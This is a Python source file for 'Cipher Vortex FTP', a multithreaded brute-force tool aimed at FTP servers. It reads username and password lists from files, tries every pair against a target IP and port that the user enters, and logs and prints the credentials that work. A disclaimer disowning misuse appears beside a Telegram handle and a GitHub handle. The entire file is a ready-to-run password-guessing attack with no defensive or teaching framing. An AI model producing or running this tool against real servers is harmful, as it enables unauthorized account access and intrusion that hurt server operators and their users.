import os
import threading
import time
import logging
import ftplib
from rich.console import Console

console = Console()

logging.basicConfig(filename='Cipher_Vortex_FTP.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def read_file(filepath):
    if not os.path.exists(filepath):
        raise FileNotFoundError(f"[!] File not found: {filepath}")
    try:
        with open(filepath, 'r', encoding='utf-8') as file:
            return file.read().splitlines()
    except IOError as e:
        logging.error(f"[!] Error reading file {filepath}: {str(e)}")
        raise

def is_valid_ip(ip):
    parts = ip.split('.')
    if len(parts) != 4:
        return False
    for part in parts:
        if not part.isdigit() or not 0 <= int(part) <= 255:
            return False
    return True

def is_valid_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

def attempt_ftp_login(ip, port, username, password):
    try:
        ftp = ftplib.FTP()
        ftp.connect(ip, port=port)
        ftp.login(username, password)
        logging.info(f"[+] FTP Success: {username}/{password} on {ip}")
        console.print(f"[+] FTP Success: {username}/{password} [IP: {ip}]", style="green")
        ftp.quit()
        return True
    except ftplib.error_perm as e:
        logging.warning(f"[-] FTP Authentication failed: {username}/{password} on {ip} - {str(e)}")
    except ftplib.all_errors as e:
        logging.error(f"[-] FTP Error: {str(e)} on {ip}")
    except Exception as e:
        logging.error(f"[-] FTP Connection failed: {str(e)} on {ip}")
    console.print(f"[-] FTP Failed: {username}/{password} [IP: {ip}]", style="red")
    return False

def brute_force_login_ftp(ip, port, usernames, passwords, delay, max_threads=10):
    success_count = 0
    failure_count = 0

    def attempt_login(username, password):
        nonlocal success_count, failure_count
        if attempt_ftp_login(ip, port, username, password):
            success_count += 1
        else:
            failure_count += 1

    threads = []
    semaphore = threading.Semaphore(max_threads)

    def threaded_attempt_login(username, password):
        with semaphore:
            attempt_login(username, password)
            time.sleep(delay)

    for username in usernames:
        for password in passwords:
            thread = threading.Thread(target=threaded_attempt_login, args=(username, password))
            thread.start()
            threads.append(thread)

    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        console.print("Operation interrupted by user. Exiting...", style="red")
        logging.info("Operation interrupted by user")

    return success_count, failure_count

def process_ftp_server(ip, port, usernames, passwords, delay):
    console.print(f"[!] Starting brute force attack on {ip}:{port} using FTP...", style="yellow")
    
    start_time = time.time()  
    success_count, failure_count = brute_force_login_ftp(ip, port, usernames, passwords, delay)
    end_time = time.time()  
    
    elapsed_time = end_time - start_time  
    console.print("[!] Brute force attack completed", style="red")
    console.print(f"[+] Total successful logins: {success_count}", style="green")
    console.print(f"[-] Total failed logins: {failure_count}", style="red")
    console.print(f"[#] Elapsed time: {elapsed_time:.2f} seconds", style="cyan")

def main():
    Cipher_Vortex_FTP = """
 ██████╗██╗██████╗ ██╗  ██╗███████╗██████╗     ██╗   ██╗ ██████╗ ██████╗ ████████╗███████╗██╗  ██╗    ███████╗████████╗██████╗ 
██╔════╝██║██╔══██╗██║  ██║██╔════╝██╔══██╗    ██║   ██║██╔═══██╗██╔══██╗╚══██╔══╝██╔════╝╚██╗██╔╝    ██╔════╝╚══██╔══╝██╔══██╗
██║     ██║██████╔╝███████║█████╗  ██████╔╝    ██║   ██║██║   ██║██████╔╝   ██║   █████╗   ╚███╔╝     █████╗     ██║   ██████╔╝
██║     ██║██╔═══╝ ██╔══██║██╔══╝  ██╔══██╗    ╚██╗ ██╔╝██║   ██║██╔══██╗   ██║   ██╔══╝   ██╔██╗     ██╔══╝     ██║   ██╔═══╝ 
╚██████╗██║██║     ██║  ██║███████╗██║  ██║     ╚████╔╝ ╚██████╔╝██║  ██║   ██║   ███████╗██╔╝ ██╗    ██║        ██║   ██║     
 ╚═════╝╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝      ╚═══╝   ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝    ╚═╝        ╚═╝   ╚═╝     
    """
    toolname = "Cipher Vortex FTP - V1.0"
    creator = "Created by Cipher security"
    channel = "Telegram: @Cipher_security"
    github = "github: Cipher1security"
    disclaimer = "[!] We are not responsible for any misuse of this tool !"

    console.print(Cipher_Vortex_FTP, style="bold blue")
    console.print(toolname, style="bold blue")
    console.print(creator, style="bold green")
    console.print(channel, style="bold green")
    console.print(github, style="bold green")
    console.print(disclaimer, style="bold red")

    ip = input("Enter the IP address of the FTP server: ")
    port = input("Enter the port of the FTP server: ")
    
    try:
        usernames = read_file('usernames.txt')
        passwords = read_file('passwords.txt')
    except FileNotFoundError as e:
        console.print(f"{e}", style="red")
        return

    delay = input("Enter the delay (in seconds) between login attempts: ")
    if not delay.isdigit() or float(delay) < 0:
        console.print("Invalid delay. Must be a non-negative number.", style="red")
        return
    delay = float(delay)

    if is_valid_ip(ip) and is_valid_port(port):
        process_ftp_server(ip, int(port), usernames, passwords, delay)
    else:
        console.print("[!] Invalid IP address or port number", style="red")

if __name__ == "__main__":
    main()